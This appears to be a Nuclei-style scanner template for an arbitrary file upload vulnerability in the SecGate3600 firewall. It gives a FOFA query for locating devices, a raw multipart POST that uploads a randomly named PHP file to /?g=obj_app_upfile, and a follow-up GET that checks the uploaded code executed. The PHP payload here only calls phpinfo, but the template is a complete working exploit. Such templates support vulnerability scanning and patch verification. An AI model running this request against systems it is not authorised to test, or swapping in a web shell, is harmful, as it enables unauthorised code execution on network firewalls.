id: SecGate3600-obj_app_upfile-UploadFile

info:
  name: 网神SecGate3600防火墙-obj_app_upfile-任意文件上传漏洞
  author: mhb17
  severity: critical
  tags: upload
  metadata:
    fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
    
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.php"
  
requests:
  - raw:
      - |-
        POST /?g=obj_app_upfile HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Content-Length: 549
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="MAX_FILE_SIZE"

        10000000
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="upfile"; filename="{{file_name}}"
        Content-Type: text/plain

        <?php phpinfo();?>

        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="submit_post"

        obj_app_upfile
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
        Content-Disposition: form-data; name="__hash__"

        0b9d6b1ab7479ab69d9f71b05e0e9445
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
      - |+
        GET /attachements/{{file_name}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, 'phpinfo()')"
          - "status_code_1 == 302 && status_code_2 == 200"
        condition: and
